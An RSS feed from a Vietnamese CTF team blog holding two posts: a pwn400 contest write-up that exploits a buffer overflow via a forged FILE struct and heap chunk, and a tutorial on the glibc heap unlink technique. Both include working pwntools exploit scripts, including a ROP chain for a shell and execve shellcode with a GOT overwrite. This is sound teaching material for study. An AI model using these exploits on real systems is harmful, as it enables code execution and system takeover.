<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	
xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
>

<channel>
	<title>hardtobelieve &#8211; BabyPhD CTF Team</title>
	<atom:link href="https://babyphd.net/author/hardtobelieve/feed/" rel="self" type="application/rss+xml" />
	<link>https://babyphd.net</link>
	<description>Nói chung đây là một khái niệm vô cùng trừu tượng</description>
	<lastBuildDate>Mon, 12 Sep 2016 09:44:28 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.2.2</generator>
<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
		<title>Whitehat Contest 12 - Pwn400</title>
		<link>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/</link>
				<comments>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/#comments</comments>
				<pubDate>Sun, 11 Sep 2016 16:29:10 +0000</pubDate>
		<dc:creator><![CDATA[hardtobelieve]]></dc:creator>
				<category><![CDATA[pwn]]></category>
		<category><![CDATA[whitehat]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=600</guid>
				<description><![CDATA[Líp vẫn nhớ và yêu Híp nhiều lắm ... Chiến đấu bên những người anh em luôn làm tôi cảm thấy thoải mái và phấn khích. Đợt contest này cả đội đã có 1 ngày không ngủ, cũng gần như không ăn, chỉ dùng lon bò húc để cầm hơi. Cả đội đã rất nỗ &#8230; <a href="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/" class="more-link">Continue reading <span class="screen-reader-text">Whitehat Contest 12 - Pwn400</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<blockquote><p>Líp vẫn nhớ và yêu Híp nhiều lắm ...</p></blockquote>
<p>Chiến đấu bên những người anh em luôn làm tôi cảm thấy thoải mái và phấn khích. Đợt contest này cả đội đã có 1 ngày không ngủ, cũng gần như không ăn, chỉ dùng lon bò húc để cầm hơi. Cả đội đã rất nỗ lực và hy vọng tràn trề khi lúc đầu liên tục tranh giành top 1 với kỳ phùng địch thủ. Cho đến giữa đêm, do thiếu một chút may mắn ( tôi thì không nghĩ vậy, đêm là khoảng thời gian tôi hay rơi vào trạng thái không ổn định <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?ssl=1"><img data-attachment-id="603" data-permalink="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/pudency/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" data-orig-size="147,147" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pudency" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" class="alignnone size-full wp-image-603" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?resize=36%2C36&#038;ssl=1" alt="pudency" width="36" height="36" data-recalc-dims="1" /></a> ) mà mọi người mất dần ý chí chiến đấu, nhìn đội khác vươn lên. Có lẽ nếu như tôi dành được 400 điểm từ bài này thì mọi chuyện đã khác. Nhưng dù sao "có lẽ" vẫn chỉ là 1 từ người ta dùng để biện hộ cho lỗi lầm của mình mà thôi.<br />
<span id="more-600"></span></p>
<p>Đề bài cho 1 file binary có chức năng dùng để viết và đọc 1 file trên server. Thoạt nhìn, tôi đã thấy bài này quen rồi, và có vẻ như <a href="http://www.hardtobelieve.me/index.php/2016/07/30/file-abusing/" target="_blank">chủ đề này</a> vừa được tôi nghiên cứu cách đây 2 tháng. Ta có thể thấy lỗi khá rõ ràng ở hàm `read_file`</p>
<pre class="lang:c decode:true ">int read_file()
{
  char ptr; // [sp+18h] [bp-110h]@4
  size_t n; // [sp+118h] [bp-10h]@4
  FILE *stream; // [sp+11Ch] [bp-Ch]@1

  printf("file name: ");
  __fpurge(stdin);
  gets(name);
  stream = fopen(name, "rb");
  if ( !stream )
  {
    puts("Error: cannot open file. ");
    exit(1);
  }
  fseek(stream, 0, 2);
  n = ftell(stream);
  fseek(stream, 0, 0);
  fread(&amp;ptr, 1u, n, stream);            // Does not check boundary of ptr
  puts(&amp;ptr);
  return fclose(stream);
}</pre>
<p>Như vậy, ta có thể cho chương trình đọc một nội dung file có kích thước lớn để kích hoạt lỗi buffer overflow. Tuy nhiên, ta cũng thấy `ptr` nằm ở `sp + 18h` còn `stream` thì nằm ở `sp + 11Ch` nên có thể khai thác lỗi bằng cách dùng bảng <em>IO_FILE_JUMP</em>.</p>
<h2>Bài toán 1</h2>
<p>Vẫn chiến thuật cũ, tôi bắt đầu từ chương trình đơn giản hơn là gọi hàm `fclose()` với tham số truyền vào là một mảng char. Sau một thời gian sử dụng gdb và "lỗi đến đâu sửa đến đó", tôi đã tìm được những giá trị cần có trong mảng</p>
<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
char a[256];

int main () {
    *((int *)a + 1) = 0xdeadbeaf;
    *((int *)a + 0x48 / 4) = a;
    *((int *)a + 0x94 / 4) = a - 4;
    fclose(a);
    return 0;
}</pre>
<p>Và tất nhiên, kết qủa sẽ là `Invalid $PC address: 0xdeadbeaf`. Tuy nhiên, lần này tôi cũng nhận ra một điều là tôi không thể truyền được tham số khi gọi hàm theo kiểu này. Nếu cấc bạn step từng bước để vào bên trong libc, các bạn sẽ thấy trước khi call ,libc sẽ thực hiện:</p>
<pre class="theme:shell-default lang:sh decode:true ">push 0x0
push esi                            ; file pointer
call DWORD PTR [eax + 0x8]</pre>
<p>Tôi phát hiện ra rằng chương trình không có stack protector, nên nếu như tôi lừa libc cho nó chạy như bình thường với mảng char, tôi có thể đè lên EIP và các gía trị sau đố rồi làm như những bài BoF bình thường. Tôi thử gọi hàm puts thì được kết qủa:</p>
<pre class="theme:shell-default lang:sh decode:true ">free(): invalid pointer: 0x0804a060 ***</pre>
<p>Không ngoài dự đoán, theo như những gì google được thì hàm `fclose()` sau khi thực hiện việc đóng file sẽ giải phóng bộ nhớ đã cấp trước đó ( file pointer cũng là "híp" mà <a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?ssl=1"><img data-attachment-id="611" data-permalink="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/big_smile/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" data-orig-size="147,147" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="big_smile" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" class="alignnone size-full wp-image-611" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?resize=36%2C36&#038;ssl=1" alt="big_smile" width="36" height="36" data-recalc-dims="1" /></a> ).</p>
<h2>Bài toán 2</h2>
<p>Như vậy, ngoài việc biến mảng <strong>a</strong> thành một con trỏ file giả, thì ta cũng cần biến nó thành một heap chunk giả nữa. Tiếp tục sử dụng gdb, lần này thêm một cửa sổ khác để debug chương trình mà free một con trỏ đã malloc thực sự. Việc này giúp ta dễ dàng theo dõi luồng thực thi của chương trình đúng và biết sẽ phải sửa cái gì cho chương trình sai. Sau một hồi lâu sửa đi sửa lại, tôi cũng có được những gía trị cần tìm ( ở đây tôi chọn fclose(a + 16) cho nó thoải mái, tránh trường hợp truy xuất vào ô nhớ nào đó phía trước ):</p>
<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
char a[256];

int main () {
    puts("abcd");
    *((int *)a + 3) = 0xa1;
    *((int *)a + 4 + 1) = 0x8048350;
    *((int *)a + 4 + 0x48 / 4) = a + 16;
    *((int *)a + 4 + 0x94 / 4) = a + 16 - 4;
    *((int *)a + 43) = 0x20b59;
    *((int *)a + 44) = a + 34*4;
    *((int *)a + 45) = a + 38*4;
    *((int *)a + 34 + 3) = a + 42*4;
    *((int *)a + 38 + 2) = a + 42*4;
    fclose(a + 16);
    return 0;
}</pre>
<p>Vậy là xong rồi, quay trở lại bài readfile, ta sẽ thực hiện 2 công việc:</p>
<ul>
<li>Gọi hàm write_file để tạo ra một file tên là "inp", nội dung sẽ là `padding + name_address + padding + rop chain`</li>
<li>Gọi hàm read_file, đọc file có tên là "inp\x00" + fake_file_struct mà ta vừa tạo ra</li>
</ul>
<p>Ez local shell, Ez life</p>
<pre class="theme:shell-default lang:sh decode:true ">[+] Opening connection to localhost on port 4000: Done
[*] Closed connection to localhost port 4000
[+] Opening connection to localhost on port 4000: Done
[*] Puts: 0xf7e5cb80
[*] Printf: 0xf7e46590
[*] Closed connection to localhost port 4000
[+] Opening connection to localhost on port 4000: Done
[*] Closed connection to localhost port 4000
[+] Opening connection to localhost on port 4000: Done
[*] Switching to interactive mode

$ id
uid=1000(tuanit96) gid=1000(hardtobelieve) groups=1000(hardtobelieve),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ whoami
tuanit96
$  </pre>
<h2> Bài toán 3 </h2>
<p><strong>Proof of Concept</strong></p>
<pre class="lang:python decode:true ">from pwn import *

def read_file(name):
	s.sendline("2")
	s.recvuntil("file name: ")
	s.sendline(name)

def write_file(name, content):
	s.sendline("1")
	s.recvuntil("file name: ")
	s.sendline(name)
	s.recvuntil("Give me the size: ")
	#print s.recv()
	s.sendline(str(len(content)))
	s.recvuntil("Give me the buffer: ")
	s.sendline(content)

name1 = "/tmp/abc"
name2 = "/tmp/def"
name3 = "/tmp/ghi"

name_addr = 0x804a0a0 + 16
puts_plt = 0x80485b0
puts_got = 0x804a01c
printf_got = 0x804a000
popret = 0x080486c3
start = 0x8048640

s = remote("localhost", 4000)
#s = remote("103.237.99.25",  23504)
#s = remote("118.70.80.143", 23504)
s.recvuntil("0:exit\n")

write_file(name1, "a"*260 + p32(name_addr) + "a"*12 + p32(puts_plt) + p32(popret) + p32(puts_got) + p32(puts_plt) + p32(popret) + p32(printf_got))

s.close()

#s = remote("118.70.80.143", 23504)
s = remote("localhost", 4000)
#s = remote("103.237.99.25",  23504)
s.recvuntil("0:exit\n")

fake_file = "\x00"*4*1 + p32(0xa1) + "\x00"*4*1              # 2 blocks
fake_file += p32(puts_plt) + "\x00"*4*16         # 17 blocks
fake_file += p32(name_addr) + "\x00"*4*14        # 15 blocks
fake_file += p32(name_addr + 38*4) + "\x00"*4*2    # 3 blocks
fake_file += p32(name_addr + 38*4)                 # 1 blocks
fake_file += p32(name_addr - 4) + "\x00"*4*1     # 2 blocks
fake_file += p32(0x20b59)                        # 1 blocks
fake_file += p32(name_addr + 30*4)                 # 1 blocks
fake_file += p32(name_addr + 34*4)

payload1 = name1 + fake_file
read_file(payload1)
data = s.recv()
data += s.recv()

puts = u32(data.split('\n')[-3][:4])
printf = u32(data.split('\n')[-2][:4])
log.info("Puts: " + hex(puts))
log.info("Printf: " + hex(printf))

s.close()

system = printf - 0x00049590 + 0x0003ad80
binsh = printf - 0x00049590 + 0x15ba3f

s = remote("localhost", 4000)
#s = remote("103.237.99.25",  23504)
#s = remote("118.70.80.143", 23504)
s.recvuntil("0:exit\n")

write_file(name1, "a"*260 + p32(name_addr) + "a"*12 + p32(system) + p32(popret) + p32(binsh))

s.close()

#s = remote("103.237.99.25",  23504)
s = remote("localhost", 4000)
s.recvuntil("0:exit\n")
read_file(payload1)
s.interactive()
</pre>
<p>Tôi hí hửng exploit với con server của họ, ngờ đâu nó chết không thương tiếc <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?ssl=1"><img data-attachment-id="586" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/beat_brick/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="beat_brick" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?resize=36%2C36&#038;ssl=1" alt="beat_brick" width="36" height="36" class="alignnone size-full wp-image-586" data-recalc-dims="1" /></a>. Đờ đẫn một lúc không hiểu chuyện gì xảy ra, tôi mới thử đem sang một máy khác chạy bản ubuntu cũ hơn tôi, và nó cũng chịu chung số phận. Có vẻ libc ở bản cũ và bản mới khác nhau ( cách xử lý, offset, ... ). Lúc đó là 2h đêm và nghĩ đến việc giờ ngồi debug lại trên libc-2.19 là tôi lại muốn đi ... Ý <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?ssl=1"><img data-attachment-id="565" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/boss/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boss" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?resize=36%2C36&#038;ssl=1" alt="boss" width="36" height="36" class="alignnone size-full wp-image-565" data-recalc-dims="1" /></a>. Tôi thầm mắng chửi ban tổ chức, lẽ ra phải đưa cả libc cho người chơi chứ, nhưng rồi lại nhận ra, có lẽ họ cũng không biết được điều đó xảy ra, cũng giống mình ban nãy vậy.</p>
<p>Vậy là tôi đã đánh mất 400 điểm dù nó đã nằm trong tay, cảm giác thật giống với việc tối đã để tuột mất tay Híp khi vẫn còn đang nắm chặt vậy ...</p>
]]></content:encoded>
							<wfw:commentRss>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/feed/</wfw:commentRss>
		<slash:comments>2</slash:comments>
						<post-id xmlns="com-wordpress:feed-additions:1">600</post-id>	</item>
		<item>
		<title>Unlink technique</title>
		<link>https://babyphd.net/2016/04/07/unlink-technique/</link>
				<pubDate>Thu, 07 Apr 2016 15:01:11 +0000</pubDate>
		<dc:creator><![CDATA[hardtobelieve]]></dc:creator>
				<category><![CDATA[pwn]]></category>
		<category><![CDATA[heap]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=498</guid>
				<description><![CDATA[Đây là một trong những kỹ thuật cơ bản dùng để khai thác lỗ hổng ở vùng nhớ heap Cấu trúc heap Glibc tổ chức 1 heap chunk như sau: struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; &#8230; <a href="https://babyphd.net/2016/04/07/unlink-technique/" class="more-link">Continue reading <span class="screen-reader-text">Unlink technique</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>Đây là một trong những kỹ thuật cơ bản dùng để khai thác lỗ hổng ở vùng nhớ heap</p>
<h1>Cấu trúc heap</h1>
<p>Glibc tổ chức 1 heap chunk như sau:</p>
<pre class="width:1000 lang:c decode:true">struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};</pre>
<p><span id="more-498"></span></p>
<p>Thông thường sau khi malloc, nếu ta dump heap ra thì sẽ chỉ thấy 2 thành phần là `prev_size` và `size`. 2 thành phần chính còn lại là fd và bk sẽ xuất hiện sau khi ta free.</p>
<h2>Trước khi free</h2>
<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?ssl=1" rel="attachment wp-att-500"><img data-attachment-id="500" data-permalink="https://babyphd.net/2016/04/07/unlink-technique/heap_before_free/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?fit=962%2C681&amp;ssl=1" data-orig-size="962,681" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="heap_before_free" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?fit=300%2C212&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?fit=604%2C428&amp;ssl=1" class="alignnone size-full wp-image-500" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?resize=604%2C428&#038;ssl=1" alt="heap_before_free" width="604" height="428" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?w=962&amp;ssl=1 962w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?resize=300%2C212&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?resize=768%2C544&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<ul>
<li>Prev_size: Nếu heapchunk liền trước không đc sử dụng, trường này sẽ chứa size của heapchunk đó. Còn nếu heapchunk trước đang được sử dụng, prev_size sẽ chứa dữ liệu từ người dùng</li>
<li>size: Trường size không những thể hiện kích thước của heap, mà còn chứa thêm 3 thông tin tương ứng với 3 bit cuối cùng
<ol>
<li>-PREV_INUSE(P): Bit P bằng 1 khi chunk trước được dùng và bằng 0 khi chunk trước không được dùng</li>
<li>IS_MAPPED(M): Bit M bằng 1 khi địa chỉ của chunk được mmap</li>
<li>NON_MAIN_ARENA(N): Bit N bằng 1 khi chunk thuộc thread arena</li>
</ol>
</li>
</ul>
<h2>Sau khi free</h2>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?ssl=1" rel="attachment wp-att-502"><img data-attachment-id="502" data-permalink="https://babyphd.net/2016/04/07/unlink-technique/heap_after_free/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?fit=940%2C668&amp;ssl=1" data-orig-size="940,668" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="heap_after_free" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?fit=300%2C213&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?fit=604%2C429&amp;ssl=1" class="alignnone size-full wp-image-502" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?resize=604%2C429&#038;ssl=1" alt="heap_after_free" width="604" height="429" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?w=940&amp;ssl=1 940w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?resize=300%2C213&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?resize=768%2C546&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<ul>
<li>Prev_size: Lúc này prev_size sẽ luôn chứa dữ liệu người dùng từ heapchunk trước đó, vì glibc không cho phép 2 chunk liên tiếp đều ở trạng thái đã bị free</li>
<li>size: Vẫn giữ nguyên khi chưa free</li>
<li>fd: Trường fd chứa địa chỉ của chunk kế tiếp trong cùng 1 bin ( Bin là 1 danh sách các chunks đã được free, sẽ được nói đến trong 1 bài riêng )</li>
<li>bk: Trường bk chứa địa chỉ của chunk liền trước trong cùng 1 bin</li>
</ul>
<h1>Unlink trong free()</h1>
<p>Thao tác unlink được glibc định nghĩa là:</p>
<pre class="lang:c decode:true ">#define unlink(AV, P, BK, FD) {
    FD = P-&gt;fd;
    BK = P-&gt;bk;
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) 
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);
    else {
        FD-&gt;bk = BK;
        BK-&gt;fd = FD; 
        if (!in_smallbin_range (P-&gt;size) 
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {
            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)
                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))
              malloc_printerr (check_action,
                               "corrupted double-linked list (not small)",
                               P, AV);
            if (FD-&gt;fd_nextsize == NULL) {
                if (P-&gt;fd_nextsize == P)
                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;
                else {
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize; 
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;
                  }
              } else {
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;
              }
          }
      }
}</pre>
<p>Khi ta gọi hàm free(), về cơ bản chương trình sẽ thực hiện các thao tác sau:</p>
<ul>
<li>Kiểm tra một số điều kiện về kích thước</li>
<li>Kiểm tra liệu có chunk liền sau chunk hiện tại và size của nó chứa thông tin chỉ ra rằng chunk hiện tại đang được sử dụng</li>
<li>Kiểm tra chunk hiện tại có nằm ở đầu freelist hay không</li>
<li>Kiểm tra chunk liền trước có phải cũng đang ở trạng thái free không</li>
<li>Nếu có, thực hiện thao tác unlink chunk đó vào nhập 2 chunk làm 1</li>
<li>Nối lại chunk sau khi đã nhập làm 1 vào freelist</li>
</ul>
<p>Ta có thể thấy thao tác unlink có thể giúp ta có được quyền viết vào một vùng bất kỳ:</p>
<pre class="lang:c decode:true ">FD-&gt;bk = BK;
BK-&gt;fd = FD;</pre>
<p>Tuy nhiên, muốn làm được vậy, ta phải bypass qua điều kiện kiểm tra của glibc. Ta sẽ xét ví dụ cụ thể sau</p>
<p>&nbsp;</p>
<h1>Kịch bản (Heap overflow)</h1>
<p>Giả sử ta có</p>
<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;

int list_addr[2];
int main () {
	list_addr[0] = (char *)malloc(0x80);
	list_addr[1] = (char *)malloc(0x80);
	gets(list_addr[0]);
	free(list_addr[1]);
	gets(list_addr[0]);
	gets(list_addr[0]);
	printf ("Good bye!\n");
	return 0;
}</pre>
<p>Chương trình sẽ yêu cầu hàm malloc một vùng nhớ là 0x80, vì giá trị này nằm ở giữa small bin và large bin (Sẽ được nói đến trong 1 bài riêng), từ đó khi thực hiện các thao tác trong lúc free sẽ đơn giản hơn.</p>
<p>Dễ thấy rằng ta có thể viết đè từ chunk1 sang chunk2 nhờ hàm gets(), từ đó sau khi free chunk2, ta sẽ làm cho hàm free sát nhập chunk1 vào chunk2 mặc dù chunk1 đang ở trong trạng thái được sử dụng. Đầu tiên, hàm free() sẽ kiểm tra bit PREV_INUSE(P) của chunk2</p>
<pre class="lang:c decode:true ">/* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p-&gt;prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
}</pre>
<p>Trước khi unlink chunk1 để sát nhập, hàm free có một bước kiểm tra để khẳng định chunk liền trước và liền sau chunk1 đang trỏ vào chunk1</p>
<pre class="lang:c decode:true ">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);</pre>
<p>Tuy nhiên, trước đó chương trình dùng 1 biến toàn cục để chứa địa chỉ của các heapchunk đã malloc nên ta có thể dựa vào đây để bypass qua câu lệnh if này. Ta cần lưu ý ở đây, vì khi free, chương trình sử dụng địa chỉ thực của heapchunk chứ không phải địa chỉ trả về cho người dùng, nên khi tạo các thông tin giả, ta phải tạo cách địa chỉ trả về ít nhất 2 blocks tương ứng với prev_size và size của chunk1, ta gọi là chunk11.</p>
<p>Tổng kết lại, ta cần thực hiện các bước sau:</p>
<ul>
<li>Bit P của chunk2 phải được gán bằng 0 để báo với hàm free() rằng chunk11 đã được free trước đó</li>
<li>Trường fd của chunk11 sẽ chứa địa chỉ của ô nhớ cách nơi lưu địa chỉ các heapchunk 3 blocks (12 bytes)</li>
<li>Trường bk của chunk11 sẽ chứa địa chỉ của ô nhớ cách nới lưu địa chỉ các heapchunk 2 blocks (8 bytes)</li>
<li>prev_size của chunk2 phải chứa size của chunk11</li>
</ul>
<p>&nbsp;</p>
<h1>Proof of concept</h1>
<p>Sau khi unlink được thì có thể có nhiều cách để khai thác tiếp: viết đè EIP, sử dụng fini_array, tls_dtor_list... Để đơn giản, bài viết sẽ khai thác bằng cách viết đè lên bảng GOT để trỏ vào nơi chứa shellcode.</p>
<pre class="lang:python decode:true">from pwn import *

s = remote("localhost", 1928)

heap_addr = 0x0804b000
list_addr = 0x0804a030
puts_got = 0x0804a018
payload = ""
block_size = 4
sh = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80"

payload += "\x00"*2*block_size
payload += p32(list_addr - 3*block_size)
payload += p32(list_addr - 2*block_size)
payload += sh + "\x90"*11
payload += "\x00"*17*block_size
payload += p32(0x80)
payload += p32(0x89 &amp; ~1)
payload += "\n"
payload += "\x00"*3*block_size + p32(puts_got)
payload += "\n"
payload += p32(heap_addr + 6*block_size)
payload += "\n"

s.send(payload)
s.interactive()</pre>
<p>Trước khi nhập payload</p>
